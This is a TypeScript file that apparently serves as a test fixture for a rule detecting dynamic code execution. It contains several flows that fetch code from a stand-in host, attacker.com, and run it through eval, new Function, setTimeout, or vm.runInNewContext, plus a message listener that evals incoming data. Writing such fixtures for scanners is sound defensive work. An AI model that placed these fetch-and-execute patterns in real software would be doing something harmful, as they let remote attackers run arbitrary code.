// Mock dependencies to avoid TS errors
import axios from 'axios';
import fetch from 'node-fetch';
import * as vm from 'vm';

async function triggerRule() {
    // Rule 1 : Dynamic Code Execution
    // Flow 1: fetch/axios/http -> eval
    const r1f1 = await axios.get('http://attacker.com/code');
    eval(r1f1.data);

    // Flow 2: fetch/http -> new Function()
    const r1f2 = await fetch('http://attacker.com/code');
    new Function(await r1f2.text())();

    // Flow 3: fetch/http -> setTimeout/setInterval (string-as-code)
    const r1f3 = await fetch('http://attacker.com/code');
    setTimeout(await r1f3.text(), 1000);

    // Flow 4: fetch/http -> vm.runInNewContext() / Script()
    const r1f4 = await fetch('http://attacker.com/code');
    vm.runInNewContext(await r1f4.text());

    // Flow 5: "message"/"data" event listener -> eval
    // (mocking window event listener)
    if (typeof window !== 'undefined') {
        window.addEventListener('message', (event: any) => {
            eval(event.data);
        });
    }
}

export {};
